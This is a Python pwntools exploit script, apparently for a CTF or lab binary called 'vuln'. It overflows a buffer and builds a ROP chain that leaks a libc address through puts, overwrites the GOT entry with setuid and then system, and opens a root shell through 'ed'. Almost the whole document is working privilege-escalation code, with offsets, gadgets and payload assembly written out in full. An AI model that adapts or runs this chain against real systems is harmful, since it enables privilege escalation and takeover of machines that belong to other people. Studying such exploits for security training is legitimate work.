#!/usr/bin/python 
from pwn import *

# Starts the process 
p = process("./vuln")

def main():
	'''
        offset = 28
	0xdeadbeef in ?? ()
	
	call   0x8048300 <read@plt>
	call   0x8048310 <puts@plt>

	0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
	0804a010  00000207 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0

        0x0804843b <+0>:	push   ebp
	'''
	offset = 28
	
	read_plt = 0x8048300
	puts_plt = 0x8048310
	
	read_got = 0x0804a00c
	puts_got = 0x0804a010

	new_setuid_plt = puts_plt
	new_system_plt = puts_plt

	# 0x080482e9 : pop ebx ; ret
	pr = 0x080482e9

	# 0x080484e9 : pop esi ; pop edi ; pop ebp ; ret
	pppr = 0x080484e9

	# vuln : 0x8048243 --> 0x70006465 ('ed')
	ed_str = 0x8048243

	# Craft payload
	payload = "A" * offset

	# ROP: leak
	rop_leak = p32(puts_plt)
	rop_leak += p32(pr)
	rop_leak += p32(puts_got)

	# ROP: write(setuid) -> read(0, puts_got, 4)
        rop_write_setuid = p32(read_plt)
        rop_write_setuid += p32(pppr)
        rop_write_setuid += p32(0) # Stdin
        rop_write_setuid += p32(puts_got) # To be overwritten with setuid()
        rop_write_setuid += p32(4)

	# ROP: setuid(0)
	rop_setuid = p32(new_setuid_plt)
	rop_setuid += p32(pr)
	rop_setuid += p32(0)

	# ROP: write(system) -> read(0, puts_got, 4)
	rop_write_system = p32(read_plt)
	rop_write_system += p32(pppr)
	rop_write_system += p32(0) # Stdin
	rop_write_system += p32(puts_got) # To be overwritten with system()
	rop_write_system += p32(4)

	# ROP: shell
	rop_shell = p32(new_system_plt)
	rop_shell += p32(0xdeadbeef)
	rop_shell += p32(ed_str)	

	# Joins the ROP gadgets
	payload += rop_leak
	payload += rop_write_setuid
	payload += rop_setuid
	payload += rop_write_system
	payload += rop_shell	

	log.info("Length: %d" % len(payload))
	payload = payload.ljust(200, '\x00')
	
	# GDB	
	# raw_input(str(p.proc.pid))
		
	p.send(payload)	
	log.warn("Stage 1: info leak")	

	reply = p.recv()

	for line in reply.split("\n"):
		if "@" in line: # Find an occurence of the returned address in current line
			leak = line[ :4] # Only interested in puts address and nothing else

			fname = 'debug'
			with open(fname, 'w') as f: # Dump address to file for debugging
				f.write(leak)

			puts_addr = u32(leak) # Unpacks integer into hex address
			log.success("puts address : 0x%x" % puts_addr)

	# 0005f140 <_IO_puts@@GLIBC_2.0>:
	puts_offset_addr = 0x0005f140
	libc_base_addr = puts_addr - puts_offset_addr
	log.success("libc base: 0x%x" % libc_base_addr)

	# 0003a940 <__libc_system@@GLIBC_PRIVATE>:
	system_offset_addr = 0x0003a940
	system_addr = libc_base_addr + system_offset_addr
	log.success("system addr: 0x%x" % system_addr)	
	
	# 000b0060 <setuid@@GLIBC_2.0>:
	setuid_offset_addr = 0x000b0060
	setuid_addr = libc_base_addr + setuid_offset_addr 
	log.success("setuid addr: 0x%x" % setuid_addr)

	p.send( p32(setuid_addr) )
	log.warn("Stage 2: Setuid 0")

	p.send( p32(system_addr) )
	log.warn("Stage 3: Execute shell")
	log.info("Dont forget to !/bin/sh to get out of ed and whoami")

	p.interactive()

if __name__ == "__main__":
	main()
